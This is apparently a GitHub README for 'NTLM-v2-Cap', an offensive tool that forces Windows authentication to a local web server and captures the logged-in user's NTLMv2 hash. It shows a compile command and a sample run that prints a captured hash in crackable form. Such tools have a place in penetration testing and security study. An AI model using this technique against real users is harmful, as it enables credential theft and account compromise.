# NTLM-v2-Cap
The tool is used to create a local webserver and force authenticate, which captures the logged in users NTLM v2 hash. 

# Compiling & Capture
```bash
csc.exe ntlmv2.cs

C:\Users\dhanush\Downloads>ntlm.exe


| \ | |_   _| |    |  \/  |        / __  \ /  __ \
|  \| | | | | |    | .  . | __   __`' / /' | /  \/ __ _ _ __
| . ` | | | | |    | |\/| | \ \ / /  / /   | |    / _` | '_ \
| |\  | | | | |____| |  | |  \ V / ./ /___ | \__/\ (_| | |_) |
\_| \_/ \_/ \_____/\_|  |_/   \_/  \_____/  \____/\__,_| .__/
                                                       | |
                                                       |_|
                                                                                                                  
                                                                                                                  

        NTLMv2 capture tool created by dagowda

[*] Server Challenge: CD14605A346D24CC
Lets start the captur
listener started
[*] Auto-triggering authentication to capture hash...
connected by client
connected by client
[*] Type 1 received
[!] Type 3 received - extracting hash

dhanush::DESKTOP-PAIU385:CD14605A346D24CC:25F5EFBAC98A4DEF402F65D72F29B0E0:01010000000000005A7B4A3ABB9FDC011DAEA237B902409000000000020000000000000000000000

[+] Authentication triggered successfully!
^C
C:\Users\dhanush\Downloads>
```

<p align="center">
  <img src="https://github.com/dagowda/NTLM-v2-Cap/blob/346b25faff7451e06f2947bd3691ff105bbb6925/images/screenshot.png" alt="image_alt">
</p>
